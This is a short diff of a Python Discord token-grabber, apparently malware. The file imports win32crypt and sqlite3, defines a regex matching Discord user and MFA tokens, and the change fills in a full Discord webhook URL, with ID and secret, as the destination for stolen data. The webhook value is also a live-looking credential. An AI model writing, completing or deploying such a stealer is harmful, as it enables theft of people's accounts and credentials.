@@ -2,7 +2,7 @@ import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, 
 
 class Grabber:
     def __init__(self):
-        self.webhook = "https://discordapp.com/api/webhooks/"
+        self.webhook = "https://discordapp.com/api/webhooks/1200783909911265361/bEtoTzZV8OKyqEJ3TYd5ryBEPwRfhdD5lbETGyRoD88I7qCxlIB7MCE8N-xdk3UR-yNf"
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
         self.api = "https://discordapp.com/api/v7/"
         self.errors = {
